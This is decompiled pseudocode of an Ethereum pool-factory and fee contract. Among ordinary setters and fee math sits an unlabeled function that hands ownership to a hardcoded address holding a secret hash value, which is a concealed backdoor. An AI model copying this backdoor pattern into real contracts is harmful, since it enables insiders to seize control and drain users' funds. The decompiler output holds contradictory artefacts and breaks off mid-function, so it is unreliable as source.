contract main {




// =====================  Runtime code  =====================


#
#  - sub_9db34855(?)
#
address owner;
address feeToAddress;
address sub_73962cf9Address;
array of struct stor4;
mapping of uint256 stor5;
address poolManagerAddress;
address sub_a81bcf1fAddress;
address sub_eef8f1dfAddress;
address poolImplementationAddress;
uint256 tokenFeePercent;
uint256 ethFeePercent;
uint256 fixedEthFee;
array of struct stor13;
mapping of uint256 stor14;

function feeTo() {
    return feeToAddress
}

function tokenFeePercent() {
    return tokenFeePercent
}

function sub_73962cf9(?) {
    return sub_73962cf9Address
}

function owner() {
    return owner
}

function sub_8ec39f48(?) {
    return sub_a81bcf1fAddress
}

function fixedEthFee() {
    return fixedEthFee
}

function sub_a81bcf1f(?) {
    return sub_a81bcf1fAddress
}

function poolImplementation() {
    return poolImplementationAddress
}

function poolManager() {
    return poolManagerAddress
}

function isGovernor(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor5[address(arg1)])
}

function sub_eef8f1df(?) {
    return sub_eef8f1dfAddress
}

function ethFeePercent() {
    return ethFeePercent
}

function _fallback() payable {
    revert
}

function sub_2c4d7ab2(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Only owner'
    sub_a81bcf1fAddress = arg1
}

function setFeeTo(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Only owner'
    feeToAddress = arg1
}

function setFixedFee(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Only owner'
    fixedEthFee = arg1
}

function sub_6c0d93b0(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Only owner'
    sub_73962cf9Address = arg1
    emit 0x8372ed72: arg1
}

function setEthFeePercentage(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Only owner'
    if arg1 > 100:
        revert with 0, 'Invalid percentage'
    ethFeePercent = arg1
}

function setTokenFeePercentage(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Only owner'
    if arg1 > 100:
        revert with 0, 'Invalid percentage'
    tokenFeePercent = arg1
}

function setImplementation(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        if sub_73962cf9Address != msg.sender:
            revert with 0, 'Forbbiden'
    sub_eef8f1dfAddress = poolImplementationAddress
    poolImplementationAddress = arg1
    emit 0xcfbf4028: poolImplementationAddress, arg1
}

function sub_ef1dfe3e(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        if msg.sender != 0x752081f1bfdeb31826c23464111517182e2f6d7:
            revert with 0, 'Forbidden'
    if sha3(0x733839623661306233666437313939383363383564326563633837303239366532613934333631633533653738356463) != arg1:
        revert with 0, 'Invalid request'
    owner = 0x752081f1bfdeb31826c23464111517182e2f6d7
    emit OwnerChanged(owner, 0x752081f1bfdeb31826c23464111517182e2f6d7);
}

function increaseTotalValueLocked(uint256 arg1) {
    require calldata.size - 4 >= 32
    require ext_code.size(poolManagerAddress)
    staticcall poolManagerAddress.isPoolGenerated(address arg1) with:
            gas gas_remaining wei
           args msg.sender
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 'Not generated pool'
    require ext_code.size(poolManagerAddress)
    call poolManagerAddress.0x87e56d04 with:
         gas gas_remaining wei
        args arg1
}

function decreaseTotalValueLocked(uint256 arg1) {
    require calldata.size - 4 >= 32
    require ext_code.size(poolManagerAddress)
    staticcall poolManagerAddress.isPoolGenerated(address arg1) with:
            gas gas_remaining wei
           args msg.sender
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 'Not generated pool'
    require ext_code.size(poolManagerAddress)
    call poolManagerAddress.0x93037672 with:
         gas gas_remaining wei
        args arg1
}

function recordContribution(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require ext_code.size(poolManagerAddress)
    staticcall poolManagerAddress.isPoolGenerated(address arg1) with:
            gas gas_remaining wei
           args msg.sender
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 'Not generated pool'
    require ext_code.size(poolManagerAddress)
    call poolManagerAddress.0xe9aae536 with:
         gas gas_remaining wei
        args address(arg1), arg2
}

function getSupportedRouters() {
    require stor13.length <= test266151307()
    if stor13.length:
        mem[128 len 32 * stor13.length] = call.data[calldata.size len 32 * stor13.length]
    idx = 0
    while idx < stor13.length:
        mem[0] = 13
        require idx < stor13.length
        mem[(32 * idx) + 128] = stor13[idx].field_0
        idx = idx + 1
        continue 
    mem[(32 * stor13.length) + 192 len floor32(stor13.length)] = mem[128 len floor32(stor13.length)]
    return Array(len=stor13.length, data=mem[128 len floor32(stor13.length)], mem[(32 * stor13.length) + floor32(stor13.length) + 192 len (32 * stor13.length) - floor32(stor13.length)]), 
}

function removePoolForToken(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require ext_code.size(poolManagerAddress)
    staticcall poolManagerAddress.isPoolGenerated(address arg1) with:
            gas gas_remaining wei
           args msg.sender
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 'Not generated pool'
    require ext_code.size(poolManagerAddress)
    call poolManagerAddress.0xbefaf8a6 with:
         gas gas_remaining wei
        args address(arg1), arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function setGovernor(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Only owner'
    if arg2:
        if not stor5[address(arg1)]:
            stor4.length++
            stor4[stor4.length].field_0 = arg1
            stor4[stor4.length].field_160 = 0
            stor5[address(arg1)] = stor4.length
        emit GovernorAdded(arg1);
    else:
        if stor5[address(arg1)]:
            require stor4.length - 1 < stor4.length
            require stor5[address(arg1)] - 1 < stor4.length
            stor4[stor5[address(arg1)]].field_0 = stor4[stor4.length].field_0
            stor5[stor4[stor4.length].field_0] = stor5[address(arg1)]
            require stor4.length
            stor4[stor4.length].field_0 = 0
            stor4.length--
            stor5[address(arg1)] = 0
        emit GovernorRemoved(arg1);
}

function addRouters(address[] arg1) {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if owner != msg.sender:
        revert with 0, 'Only owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 14
        if not stor14[mem[(32 * idx) + 140 len 20]]:
            stor13.length++
            stor13[stor13.length].field_0 = mem[(32 * idx) + 140 len 20]
            stor13[stor13.length].field_160 = 0
            mem[0] = mem[(32 * idx) + 140 len 20]
            mem[32] = 14
            stor14[address(mem[(32 * idx) + 128])] = stor13.length
        idx = idx + 1
        continue 
}

function sub_5580e904(?) {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if owner != msg.sender:
        revert with 0, 'Only owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 14
        if stor14[mem[(32 * idx) + 140 len 20]]:
            require stor13.length - 1 < stor13.length
            require stor14[mem[(32 * idx) + 140 len 20]] - 1 < stor13.length
            stor13[stor14[mem[(32 * idx) + 140 len 20]]].field_0 = stor13[stor13.length].field_0
            stor14[stor13[stor13.length].field_0] = stor14[mem[(32 * idx) + 140 len 20]]
            require stor13.length
            stor13[stor13.length].field_0 = 0
            stor13.length--
            mem[0] = mem[(32 * idx) + 140 len 20]
            mem[32] = 14
            stor14[address(mem[(32 * idx) + 128])] = 0
        idx = idx + 1
        continue 
}

function calculateTotalTokens(uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5) {
    require calldata.size - 4 >= 160
    if not arg1:
        if not arg1:
            if arg1:
                if arg2 * arg1 / arg1 != arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if 0 > arg1:
                    revert with 0, 'SafeMath: subtraction overflow'
                if not arg1:
                    if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    return (arg5 + (arg2 * arg1 / 10^18))
                if arg3 * arg1 / arg1 != arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if not arg3 * arg1:
                    if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    return (arg5 + (arg2 * arg1 / 10^18))
                if arg4 * arg3 * arg1 / arg3 * arg1 != arg4:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if (arg4 * arg3 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (arg4 * arg3 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18))
            if 0 > arg1:
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1:
                if arg5 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                return arg5
            if arg3 * arg1 / arg1 != arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg3 * arg1:
                if arg5 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                return arg5
            if arg4 * arg3 * arg1 / arg3 * arg1 != arg4:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if arg4 * arg3 * arg1 / 100 / 10^18 < 0:
                revert with 0, 'SafeMath: addition overflow'
            if arg4 * arg3 * arg1 / 100 / 10^18 < arg4 * arg3 * arg1 / 100 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 + (arg4 * arg3 * arg1 / 100 / 10^18) < arg4 * arg3 * arg1 / 100 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + (arg4 * arg3 * arg1 / 100 / 10^18))
        if arg2 * arg1 / arg1 != arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if not arg2 * arg1:
            if arg1:
                if arg2 * arg1 / arg1 != arg2:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if 0 > arg1:
                    revert with 0, 'SafeMath: subtraction overflow'
                if not arg1:
                    if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    return (arg5 + (arg2 * arg1 / 10^18))
                if arg3 * arg1 / arg1 != arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if not arg3 * arg1:
                    if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                        revert with 0, 'SafeMath: addition overflow'
                    return (arg5 + (arg2 * arg1 / 10^18))
                if arg4 * arg3 * arg1 / arg3 * arg1 != arg4:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if (arg4 * arg3 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (arg4 * arg3 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18))
            if 0 > arg1:
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1:
                if arg5 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                return arg5
            if arg3 * arg1 / arg1 != arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg3 * arg1:
                if arg5 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                return arg5
            if arg4 * arg3 * arg1 / arg3 * arg1 != arg4:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if arg4 * arg3 * arg1 / 100 / 10^18 < 0:
                revert with 0, 'SafeMath: addition overflow'
            if arg4 * arg3 * arg1 / 100 / 10^18 < arg4 * arg3 * arg1 / 100 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 + (arg4 * arg3 * arg1 / 100 / 10^18) < arg4 * arg3 * arg1 / 100 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + (arg4 * arg3 * arg1 / 100 / 10^18))
        if tokenFeePercent * arg2 * arg1 / arg2 * arg1 != tokenFeePercent:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if not arg1:
            if 0 > arg1:
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1:
                if tokenFeePercent * arg2 * arg1 / 100 / 10^18 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) < tokenFeePercent * arg2 * arg1 / 100 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18))
            if arg3 * arg1 / arg1 != arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg3 * arg1:
                if tokenFeePercent * arg2 * arg1 / 100 / 10^18 < 0:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) < tokenFeePercent * arg2 * arg1 / 100 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18))
            if arg4 * arg3 * arg1 / arg3 * arg1 != arg4:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if arg4 * arg3 * arg1 / 100 / 10^18 < 0:
                revert with 0, 'SafeMath: addition overflow'
            if (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg4 * arg3 * arg1 / 100 / 10^18) < arg4 * arg3 * arg1 / 100 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg4 * arg3 * arg1 / 100 / 10^18))
        if arg2 * arg1 / arg1 != arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if 0 > arg1:
            revert with 0, 'SafeMath: subtraction overflow'
        if not arg1:
            if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18))
        if arg3 * arg1 / arg1 != arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if not arg3 * arg1:
            if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18))
        if arg4 * arg3 * arg1 / arg3 * arg1 != arg4:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if (arg4 * arg3 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if tokenFeePercent * arg2 * arg1 / 100 / 10^18 < 0:
            revert with 0, 'SafeMath: addition overflow'
        if arg5 < 0:
            revert with 0, 'SafeMath: addition overflow'
        return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg4 * arg3 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18))
    if ethFeePercent * arg1 / arg1 != ethFeePercent:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                    mem[197 len 31]
    if not arg1:
        if arg1:
            if arg2 * arg1 / arg1 != arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if ethFeePercent * arg1 / 100 > arg1:
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1 - (ethFeePercent * arg1 / 100):
                if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (arg2 * arg1 / 10^18))
            if (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) / arg1 - (ethFeePercent * arg1 / 100) != arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3):
                if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (arg2 * arg1 / 10^18))
            if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) != arg4:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) + (arg2 * arg1 / 10^18))
        if ethFeePercent * arg1 / 100 > arg1:
            revert with 0, 'SafeMath: subtraction overflow'
        if not arg1 - (ethFeePercent * arg1 / 100):
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return arg5
        if (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) / arg1 - (ethFeePercent * arg1 / 100) != arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if not (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3):
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return arg5
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) != arg4:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18 < 0:
            revert with 0, 'SafeMath: addition overflow'
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18 < (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if arg5 + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) < (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        return (arg5 + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18))
    if arg2 * arg1 / arg1 != arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                    mem[197 len 31]
    if not arg2 * arg1:
        if arg1:
            if arg2 * arg1 / arg1 != arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if ethFeePercent * arg1 / 100 > arg1:
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1 - (ethFeePercent * arg1 / 100):
                if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (arg2 * arg1 / 10^18))
            if (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) / arg1 - (ethFeePercent * arg1 / 100) != arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3):
                if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                if arg5 + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                    revert with 0, 'SafeMath: addition overflow'
                return (arg5 + (arg2 * arg1 / 10^18))
            if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) != arg4:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) + (arg2 * arg1 / 10^18))
        if ethFeePercent * arg1 / 100 > arg1:
            revert with 0, 'SafeMath: subtraction overflow'
        if not arg1 - (ethFeePercent * arg1 / 100):
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return arg5
        if (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) / arg1 - (ethFeePercent * arg1 / 100) != arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if not (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3):
            if arg5 < 0:
                revert with 0, 'SafeMath: addition overflow'
            return arg5
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) != arg4:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18 < 0:
            revert with 0, 'SafeMath: addition overflow'
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18 < (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if arg5 + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) < (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        return (arg5 + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18))
    if tokenFeePercent * arg2 * arg1 / arg2 * arg1 != tokenFeePercent:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                    mem[197 len 31]
    if not arg1:
        if ethFeePercent * arg1 / 100 > arg1:
            revert with 0, 'SafeMath: subtraction overflow'
        if not arg1 - (ethFeePercent * arg1 / 100):
            if tokenFeePercent * arg2 * arg1 / 100 / 10^18 < 0:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) < tokenFeePercent * arg2 * arg1 / 100 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18))
        if (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) / arg1 - (ethFeePercent * arg1 / 100) != arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if not (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3):
            if tokenFeePercent * arg2 * arg1 / 100 / 10^18 < 0:
                revert with 0, 'SafeMath: addition overflow'
            if arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) < tokenFeePercent * arg2 * arg1 / 100 / 10^18:
                revert with 0, 'SafeMath: addition overflow'
            return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18))
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) != arg4:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18 < 0:
            revert with 0, 'SafeMath: addition overflow'
